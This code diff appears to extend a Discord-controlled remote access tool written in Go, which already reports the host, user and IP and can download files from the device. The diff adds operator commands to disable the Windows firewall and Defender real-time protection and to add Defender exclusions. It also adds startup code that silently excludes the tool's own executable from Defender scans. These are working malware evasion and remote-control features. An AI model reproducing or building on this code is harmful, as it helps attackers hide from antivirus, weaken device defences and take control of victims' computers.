@@ -209,6 +209,66 @@ func main() {
 			},
 		},
 		{
+			Name:        "winsec",
+			Description: "Show Windows firewall and Defender status for this device",
+		},
+		{
+			Name:        "winfirewall",
+			Description: "Turn Windows firewall on or off",
+			Options: []*discordgo.ApplicationCommandOption{
+				{
+					Type:        discordgo.ApplicationCommandOptionString,
+					Name:        "mode",
+					Description: "on or off",
+					Required:    true,
+					Choices: []*discordgo.ApplicationCommandOptionChoice{
+						{
+							Name:  "on",
+							Value: "on",
+						},
+						{
+							Name:  "off",
+							Value: "off",
+						},
+					},
+				},
+			},
+		},
+		{
+			Name:        "windefender",
+			Description: "Turn Windows Defender real-time protection on or off",
+			Options: []*discordgo.ApplicationCommandOption{
+				{
+					Type:        discordgo.ApplicationCommandOptionString,
+					Name:        "mode",
+					Description: "on or off",
+					Required:    true,
+					Choices: []*discordgo.ApplicationCommandOptionChoice{
+						{
+							Name:  "on",
+							Value: "on",
+						},
+						{
+							Name:  "off",
+							Value: "off",
+						},
+					},
+				},
+			},
+		},
+		{
+			Name:        "windefenderexclude",
+			Description: "Exclude a path from Windows Defender scans",
+			Options: []*discordgo.ApplicationCommandOption{
+				{
+					Type:        discordgo.ApplicationCommandOptionString,
+					Name:        "path",
+					Description: "Path to exclude (empty for current executable)",
+					Required:    false,
+				},
+			},
+		},
+		{
 			Name:        "download",
 			Description: "Download a file from this device",
 			Options: []*discordgo.ApplicationCommandOption{
@@ -309,6 +369,25 @@ func main() {
 	}
 	sessionId := fmt.Sprintf("%s | %s | %s", hostname, currentUser.Username, ipStr)
 	cwd, _ := os.Getwd()
+	firewallStatus := "n/a"
+	defenderStatus := "n/a"
+	if runtime.GOOS == "windows" {
+		firewallStatus = "unknown"
+		defenderStatus = "unknown"
+		if err := ensureCurrentExeDefenderExcluded(); err != nil {
+			log.Printf("failed to ensure Defender exclusion for current executable: %v", err)
+		}
+		if fw, err := windowsFirewallStatus(); err == nil {
+			firewallStatus = fw
+		} else if err != nil {
+			firewallStatus = "unknown (error: " + truncateError(err.Error(), 120) + ")"
+		}
+		if def, err := windowsDefenderStatus(); err == nil {
+			defenderStatus = def
+		} else if err != nil {
+			defenderStatus = "unknown (error: " + truncateError(err.Error(), 120) + ")"
+		}
+	}
 	var categoryName string
 	switch runtime.GOOS {
 	case "windows":
@@ -356,7 +435,9 @@ func main() {
 			"🖥️ Hostname: `%s`\n"+
 			"💽 OS: %s\n"+
 			"🔧 Arch: `%s`\n"+
-			"📂 CWD: `%s`",
+			"📂 CWD: `%s`\n"+
+			"🛡 Firewall: `%s`\n"+
+			"🧬 Defender: `%s`",
 		sessionId,
 		ipStr,
 		currentUser.Username,
@@ -364,6 +445,8 @@ func main() {
 		osLabel,
 		runtime.GOARCH,
 		cwd,
+		firewallStatus,
+		defenderStatus,
 	)
 	m, _ := dg.ChannelMessageSend(myChannelId, firstMsg)
 	dg.ChannelMessagePin(myChannelId, m.ID)
